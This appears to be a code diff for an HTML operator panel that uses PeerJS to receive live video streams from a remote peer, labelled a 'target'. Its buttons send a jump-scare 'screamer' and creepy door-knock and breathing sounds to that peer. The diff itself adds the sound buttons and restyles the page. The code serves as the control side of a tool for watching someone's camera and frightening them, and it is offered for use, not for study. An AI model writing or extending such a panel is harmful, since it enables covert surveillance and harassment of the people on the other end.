@@ -1,49 +1,53 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>TERMINAL v10.0</title>
-    <meta charset="utf-8">
+    <title>TERMINAL PRO</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        body { background: #050505; color: #0f0; font-family: monospace; display: flex; margin: 0; height: 100vh; }
-        #side { width: 280px; background: #0a0a0a; border-right: 1px solid #222; padding: 20px; }
-        #monitor { flex: 1; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 10px; overflow-y: auto; }
-        video { width: 100%; border: 1px solid #333; border-radius: 5px; background: #000; }
+        body { background: #050505; color: #0f0; font-family: monospace; display: flex; margin: 0; }
+        #side { width: 250px; padding: 20px; border-right: 1px solid #222; background: #0a0a0a; height: 100vh; }
+        #monitor { flex: 1; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 15px; }
+        video { width: 100%; border: 1px solid #0f0; border-radius: 5px; background: #000; }
         .btn { padding: 12px; width: 100%; cursor: pointer; margin-bottom: 10px; border: 1px solid #0f0; background: none; color: #0f0; font-weight: bold; }
         .btn:hover { background: #0f0; color: #000; }
+        .btn-red { border-color: #ff0050; color: #ff0050; }
+        .btn-red:hover { background: #ff0050; color: #fff; }
     </style>
 </head>
 <body>
     <div id="side">
-        <h2 style="color: #ff0050;">TERMINAL</h2>
-        <div id="status" style="margin-bottom: 20px;">ОЖИДАНИЕ...</div>
-        <button class="btn" onclick="send('SCR')" style="color:#ff0050; border-color:#ff0050;">💀 СКРИМЕР</button>
+        <h2 style="color: #ff0050;">PANEL</h2>
+        <div id="st">STATUS: STARTING...</div>
+        <hr border="1" color="#222" style="margin: 20px 0;">
+        <button class="btn btn-red" onclick="send('SCR')">💀 СКРИМЕР</button>
+        <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/knock-on-door.mp3')">🚪 СТУК В ДВЕРЬ</button>
+        <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/heavy_breathing.mp3')">👤 ДЫХАНИЕ</button>
     </div>
     <div id="monitor"></div>
 
     <script>
-        const MY_ID = '09062012';
-        const peer = new Peer(MY_ID);
-        let activeConn = null;
+        const peer = new Peer('STABLE_777');
+        let activeConn;
 
-        peer.on('open', () => document.getElementById('status').innerText = "СИСТЕМА ГОТОВА");
-
-        peer.on('connection', conn => {
-            activeConn = conn;
-            document.getElementById('status').innerText = "ЦЕЛЬ ПОДКЛЮЧЕНА";
+        peer.on('open', () => document.getElementById('st').innerText = "STATUS: ONLINE");
+        
+        peer.on('connection', c => {
+            activeConn = c;
+            document.getElementById('st').innerText = "STATUS: CONNECTED";
         });
 
         peer.on('call', call => {
             call.answer();
             call.on('stream', stream => {
-                const video = document.createElement('video');
-                video.autoplay = true;
-                video.srcObject = stream;
-                document.getElementById('monitor').appendChild(video);
+                const v = document.createElement('video');
+                v.autoplay = true;
+                v.srcObject = stream;
+                document.getElementById('monitor').appendChild(v);
             });
         });
 
         function send(t) { if(activeConn) activeConn.send({ type: t }); }
+        function snd(u) { if(activeConn) activeConn.send({ type: 'SND', url: u }); }
     </script>
 </body>
 </html>
